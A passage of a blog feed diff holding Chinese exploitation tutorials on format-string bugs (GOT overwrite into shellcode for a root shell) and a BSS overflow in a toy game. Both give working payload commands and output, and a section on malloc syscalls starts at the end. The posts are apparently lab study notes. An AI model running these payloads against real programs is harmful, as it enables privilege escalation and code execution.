+</li>
+<li><p>会打印输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">7th: 70, 4th: 00040</div></pre></td></tr></table></figure>
+</li>
+<li><p>即%7$d 获取的将是参数列表中第7个元素的值，%4$05d 获取的是第四个参数的值，且有效位长度是5</p>
+</li>
+<li>使用short writes,一个四字节的值可以使用两个%hn去完成覆盖。</li>
+<li>例如下面的输入  $(printf “\x30\xa0\x04\x08\x32\xa0\x04\x08”)%43699x%4\$hn%8738x%5\$hn 会将test_val地址的值修改为0xccddaabb<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ gdb -q </div><div class="line">gdb-peda$ p/h 0xaabb - 8</div><div class="line">Size letters are meaningless in &quot;print&quot; command.</div><div class="line">gdb-peda$ p/d 0xaabb - 8</div><div class="line">$1 = 43699</div><div class="line">gdb-peda$ p/d 0xccdd - 0xaabb</div><div class="line">$2 = 8738</div><div class="line">gdb-peda$ quit</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  123</div><div class="line">The right way to print user-controlled input:</div><div class="line">123</div><div class="line">The wrong way to print user-controlled input:</div><div class="line">123</div><div class="line">[*] test_val @ 0x0804a030 = -72 0xffffffb8</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  $(printf &quot;\x30\xa0\x04\x08\x32\xa0\x04\x08&quot;)%43699x%4\$hn%8738x%5\$hn</div><div class="line">The right way to print user-controlled input:</div><div class="line">0�2�%43699x%4$hn%8738x%5$hn</div><div class="line">The wrong way to print user-controlled input:</div><div class="line">0�2� ...</div><div class="line">[*] test_val @ 0x0804a030 = -857888069 0xccddaabb</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="覆盖GOT表"><a href="#覆盖GOT表" class="headerlink" title="覆盖GOT表"></a>覆盖GOT表</h4><ul>
+<li>可能会有人问能不能通过这种漏洞来getshell呢，答案是可以的，且方法不止一种，下面介绍一种相对来说简单且常用的方法，通过覆盖GOT表方法来getshell的trick，总体的思路就是程序最后要执行exit函数，我们覆盖exit函数的地址为shellcode的地址来达到getshell的目的。</li>
+<li>我们知道一个程序可以使用共享库，那么它必然有一个存放了各个函数对应的地址的表，这个表就是PLT(procedure linkage table)。</li>
+<li><p>使用objdump 查看plt section</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -d -j .plt ./fmt_vuln</div><div class="line"></div><div class="line">./fmt_vuln:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .plt:</div><div class="line"></div><div class="line">08048360 &lt;printf@plt-0x10&gt;:</div><div class="line"> 8048360:	ff 35 04 a0 04 08    	pushl  0x804a004</div><div class="line"> 8048366:	ff 25 08 a0 04 08    	jmp    *0x804a008</div><div class="line"> 804836c:	00 00                	add    %al,(%eax)</div><div class="line">	...</div><div class="line"></div><div class="line">08048370 &lt;printf@plt&gt;:</div><div class="line"> 8048370:	ff 25 0c a0 04 08    	jmp    *0x804a00c</div><div class="line"> 8048376:	68 00 00 00 00       	push   $0x0</div><div class="line"> 804837b:	e9 e0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">08048380 &lt;strcpy@plt&gt;:</div><div class="line"> 8048380:	ff 25 10 a0 04 08    	jmp    *0x804a010</div><div class="line"> 8048386:	68 08 00 00 00       	push   $0x8</div><div class="line"> 804838b:	e9 d0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">08048390 &lt;puts@plt&gt;:</div><div class="line"> 8048390:	ff 25 14 a0 04 08    	jmp    *0x804a014</div><div class="line"> 8048396:	68 10 00 00 00       	push   $0x10</div><div class="line"> 804839b:	e9 c0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483a0 &lt;__gmon_start__@plt&gt;:</div><div class="line"> 80483a0:	ff 25 18 a0 04 08    	jmp    *0x804a018</div><div class="line"> 80483a6:	68 18 00 00 00       	push   $0x18</div><div class="line"> 80483ab:	e9 b0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483b0 &lt;exit@plt&gt;:</div><div class="line"> 80483b0:	ff 25 1c a0 04 08    	jmp    *0x804a01c</div><div class="line"> 80483b6:	68 20 00 00 00       	push   $0x20</div><div class="line"> 80483bb:	e9 a0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483c0 &lt;__libc_start_main@plt&gt;:</div><div class="line"> 80483c0:	ff 25 20 a0 04 08    	jmp    *0x804a020</div><div class="line"> 80483c6:	68 28 00 00 00       	push   $0x28</div><div class="line"> 80483cb:	e9 90 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div><div class="line"></div><div class="line">080483d0 &lt;putchar@plt&gt;:</div><div class="line"> 80483d0:	ff 25 24 a0 04 08    	jmp    *0x804a024</div><div class="line"> 80483d6:	68 30 00 00 00       	push   $0x30</div><div class="line"> 80483db:	e9 80 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</div></pre></td></tr></table></figure>
+</li>
+<li><p>如上所示可以看到exit函数的相关跳转，但是这个plt section是READONLY即只读不可修改的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -h ./fmt_vuln | grep -A1 &quot;\ .plt\ &quot;</div><div class="line"> 11 .plt          00000080  08048360  08048360  00000360  2**4</div><div class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</div></pre></td></tr></table></figure>
+</li>
+<li><p>但如果仔细看的话，可以知道jmp    *0x804a01c 中的jmp地址并不是一个直接的地址，而是一个指针指向的地址，即exit函数的地址是存放在地址0x804a01c处的。</p>
+</li>
+<li>这些个地址是存在放另外的section的，叫做global offset table(GOT),它是可写的。然后通过objdump可以获取的到。<br><img src="/2018/04/07/格式化字符串漏洞/objgot.png" alt=""> </li>
+<li><p>如上说明exit函数是在0x0804a01c这个地址上的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./fmt_vuln $(printf &quot;\x1e\xa0\x04\x08\x1c\xa0\x04\x08&quot;)%49143x%4\$hn%12981x%5\$hn</div></pre></td></tr></table></figure>
+</li>
+<li><p>这次我们还是将shellcode放入到环境变量中，然后将exit函数的地址指向shellcode所存放的环境变量(这种一般是用在提权操作上,普通用户运行了setuid的程序)<br><img src="/2018/04/07/格式化字符串漏洞/shell1.png" alt=""><br><img src="/2018/04/07/格式化字符串漏洞/shell2.png" alt=""></p>
+</li>
+<li>如上，当程序调用exit函数的时候，通过PLT跳转并在GOT表中获取到了调用的地址,由于这个地址已经被修改为shellcode的入口地址，所以我们就获取到了root权限的shell。</li>
+<li>可以写任意地址其实就提供了很多种可能性，只要是可写的内存且包含了程序执行流的都可以是写入的目标。<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
+<li>这里就主要过程做了说明，想要真正理解还需要自己动手去实践。<br><a href="https://github.com/kevien/exploitcode/tree/master/formatstringexp" target="_blank" rel="external">github repo</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li>《Hacking the art of exploitation》0x352</li>
+<li>漏洞挖掘基础之格式化字符串<br><a href="http://drops.xmd5.com/static/drops/papers-9426.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-9426.html</a></li>
+<li>格式化字符串漏洞简介<br><a href="http://drops.xmd5.com/static/drops/binary-7714.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/binary-7714.html</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，ctf的pwn中经常会遇到，这
+    
+    </summary>
+    
+    
+      <category term="reverse" scheme="http://kevien.github.io/tags/reverse/"/>
+    
+      <category term="linux" scheme="http://kevien.github.io/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>BSS段的溢出攻击</title>
+    <link href="http://kevien.github.io/2018/03/22/BSS%E6%AE%B5%E7%9A%84%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
+    <id>http://kevien.github.io/2018/03/22/BSS段的溢出攻击/</id>
+    <published>2018-03-21T17:30:17.000Z</published>
+    <updated>2018-07-17T15:02:50.938Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">原文已发布至seebug</div><div class="line">https://paper.seebug.org/548/</div></pre></td></tr></table></figure>
+<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>缓冲区溢出除了典型的<a href="https://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">栈溢出</a>和<a href="https://kevien.github.io/2017/10/28/堆溢出利用笔记/">堆溢出</a>外，还有一种发生在bss段上的，bss属于数据段的一种，通常用来保存未初始化的全局静态变量。<a href="https://www.wikiwand.com/en/BSS" target="_blank" rel="external">wiki</a></li>
+<li>测试环境ubuntu14.04X86.<h4 id="vul-code-snippet"><a href="#vul-code-snippet" class="headerlink" title="vul code snippet"></a>vul code snippet</h4></li>
+<li><p>from game_of_chance.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// Custom user struct to store information about users </div><div class="line">struct user &#123;</div><div class="line">    int uid;</div><div class="line">    int credits;</div><div class="line">    int highscore;</div><div class="line">    char name[100];</div><div class="line">    int (*current_game) ();</div><div class="line">&#125;;</div><div class="line"></div><div class="line">...</div><div class="line">struct user player;     // Player struct</div></pre></td></tr></table></figure>
+</li>
+<li><p>其中game_of_chance 是如下图的一个小游戏<br><img src="/2018/03/22/BSS段的溢出攻击/game.png" alt=""></p>
+</li>
+<li><p>如上的代码片段中用一个函数指针保存了上次玩了哪个游戏，这个指针保存在user的结构体中，且被声明为全局变量，这意味着user这个结构体变量保存在bss数据段。其中结构体中固定为100字节的name变量保存了用户的姓名，且这个name是可以被input_name()这个函数所控制的，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">void input_name() &#123;</div><div class="line">   char *name_ptr, input_char=&apos;\n&apos;;</div><div class="line">   while(input_char == &apos;\n&apos;)    // Flush any leftover </div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // newline chars.</div><div class="line">   </div><div class="line">   name_ptr = (char *) &amp;(player.name); // name_ptr = player name&apos;s address</div><div class="line">   while(input_char != &apos;\n&apos;) &#123;  // Loop until newline.</div><div class="line">      *name_ptr = input_char;   // Put the input char into name field.</div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // Get the next char.</div><div class="line">      name_ptr++;               // Increment the name pointer.</div><div class="line">   &#125;</div><div class="line">   *name_ptr = 0;  // Terminate the string.</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>这个函数会接收用户输入的名字直到遇到换行符，所以这里并没有有效的限制用户输入，就意味着可以被利用，此外我们覆盖之后还需要程序去调用这个函数指针，这个功能可以发生在下面代码的6、8或者10行以及play_the_game()函数中，代码片段如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">if((choice &lt; 1) || (choice &gt; 7))</div><div class="line">       printf(&quot;\n[!!] The number %d is an invalid selection.\n\n&quot;, choice);</div><div class="line">    else if (choice &lt; 4) &#123;  // Othewise, choice was a game of some sort.</div><div class="line">          if(choice != last_game) &#123; // If the function ptr isn&apos;t set</div><div class="line">             if(choice == 1)        // then point it at the selected game </div><div class="line">                player.current_game = pick_a_number;   </div><div class="line">             else if(choice == 2)                     </div><div class="line">                player.current_game = dealer_no_match;</div><div class="line">             else</div><div class="line">                player.current_game = find_the_ace;</div><div class="line">             last_game = choice;   // and set last_game.</div><div class="line">          &#125;</div><div class="line">          play_the_game();   // Play the game.</div><div class="line">       &#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
+<li>如果last_game 未设置，函数指针current_game 会被指向成0或者-1，这时不会触发漏洞，后面last_game被设置成1，当修改完名字完成对current_game覆盖再玩游戏1的时候，进入play_the_game()函数,play_the_game()会有current_game指针变量的调用，此时漏洞即触发！！！<br><img src="/2018/03/22/BSS段的溢出攻击/gamemain.png" alt=""></li>
+<li>我们可以通过ctrl+z挂起当前的进程(这个时候last_game变量被设置成了1(因为刚才玩的是游戏choice是1))，我们找到可以被溢出的变量name，然后通过简单调试看一下name和current_game指针在内存中的位置关系。<br><img src="/2018/03/22/BSS段的溢出攻击/distance.png" alt=""></li>
+<li>如上图所示，正好是100个字节，通过以上我们可以进行如下的覆盖尝试<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;A&quot;x100 . &quot;BBBB&quot; . &quot;\n&quot;&apos;</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/03/22/BSS段的溢出攻击/flowattempt.png" alt=""></p>
+<ul>
+<li>可以看到程序崩溃之前curren_game已被成功覆盖为BBBB，这个时候我们需要一个”有效的”地址去做我们想要做的事情。</li>
+<li>nm命令可以查看程序的符号表，来看一下程序有哪些函数以及其对应的内存地址（此思路常用于破解）。<br><img src="/2018/03/22/BSS段的溢出攻击/jackpot.png" alt=""></li>
+<li>jackpot函数是我们理想的目标，这个函数用来给我们增加”金币”,所以当current_game函数指针被覆盖成这个函数的时候，我们就可以拥有无数”金币”</li>
+<li><p>这个程序通过标准输入进行用户交互，我们完全可以使用脚本实现自动化，如下的例子将会自动选择游戏1，然后猜测数字7，当被问是否还玩的时候选择no，最后通过选择7退出程序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n7\nn\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
+</li>
+<li><p>同样的技巧可以用到自动化exploit中，下面的命令会完成修改用户名为100个A加jackpot()的地址，这个时候就覆盖掉了current_game的地址，然后当再次选择我们要玩的游戏的后，jackpot()函数就会被调用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\nn\n&quot; . &quot;7\n&quot;&apos; | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 90 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 11</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 80 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048ca5</div><div class="line">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</div><div class="line">You have won the jackpot of 100 credits!</div><div class="line"></div><div class="line">You now have 180 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 180 credits] -&gt;  </div><div class="line">Thanks for playing! Bye.</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$</div></pre></td></tr></table></figure>
+</li>
+<li><p>可以看到函数被调用我们增加了100金币</p>
+</li>
+<li>因为只要有调用函数指针的操作就会触发jackpot函数，只要我们不退出，就可以无限刷金币,像是如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\n&quot; .&quot;y\n&quot;x10.  &quot;n\n5\nM0rk\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/03/22/BSS段的溢出攻击/getall.png" alt=""></p>
+<ul>
+<li>到这里可能有人会问那能不能getshell呢，答案是可以的，我们知道每个运行的程序都会加载环境变量，我们可以事先将shellcode写入到环境变量中，然后将跳转地址指向shellcode，就可以执行我们的shellcode了。getenvaddr用来获取SHELLCODE环境变量在程序运行时候所在的地址。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ echo $SHELLCODE</div><div class="line">��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀j</div><div class="line">                                                          XQh//shh/bin��Q��S��̀</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ ./getenvaddr SHELLCODE ./game_of_chance</div><div class="line">SHELLCODE will be at 0xbffff206</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n7\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x06\xf2\xff\xbf\n&quot; . &quot;1\n&quot;&apos; &gt; exploit_buff</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ cat exploit_buff - | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1260 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 6</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 1250 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0xbffff206</div><div class="line">id</div><div class="line">uid=1000(xxx) gid=1000(xxx) groups=1000(xxx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="相关源码下载"><a href="#相关源码下载" class="headerlink" title="相关源码下载"></a>相关源码下载</h4><p><a href="https://github.com/kevien/exploitcode/tree/master/bssexploit" target="_blank" rel="external">github repo</a></p>
+<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul>
+<li>《Hacking the art of exploitation》0x342</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;c
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>malloc的系统调用</title>
+    <link href="http://kevien.github.io/2018/03/18/malloc%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
+    <id>http://kevien.github.io/2018/03/18/malloc的系统调用/</id>
+    <published>2018-03-17T17:27:46.000Z</published>
+    <updated>2018-03-19T04:52:22.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>在读这篇文章的时候你应该知道c语言的malloc是使用系统调用从操作系统申请内存的，这两个系统调用分别是<a href="http://man7.org/linux/man-pages/man2/sbrk.2.html" target="_blank" rel="external">brk</a>和<a href="http://man7.org/linux/man-pages/man2/mmap.2.html" target="_blank" rel="external">mmap</a>。<h4 id="prco-pid-maps文件"><a href="#prco-pid-maps文件" class="headerlink" title="/prco/$pid/maps文件"></a>/prco/$pid/maps文件</h4></li>
+<li>先来简单看下这个文件，这个文件会显示整个进程的地址空间分布情况。<br><img src="/2018/03/18/malloc的系统调用/maps.png" alt=""><h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4></li>
+<li>brk从内核获取内存是通过增加程序中断地址方式的，开始于start_brk,结束于brk，初始的时候两者都指向的是同一个位置。</li>
+<li>当ASLR关闭的时候，start_brk和brk都是指向bss段的尾部的</li>
+<li>当ASLR开启的时候，start_brk和brk初始位置是bss段的尾部加一个随机的偏移。<br><img src="/2018/03/18/malloc的系统调用/linuxFlexibleAddressSpaceLayout.png" alt=""><br>nice pic，ah</li>
+<li>如上图虚拟内存地址空间分布图所示，start_brk即是堆空间的开始，brk即是堆空间的结束。</li>
+<li><p>!注意，后面的测试均是关闭ASLR后测试输出，此外测试系统使用的是ubuntu14.04.1X64操作系统。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">关闭ASLR的方法</div><div class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
+</li>
+<li><p>示例代码</p>
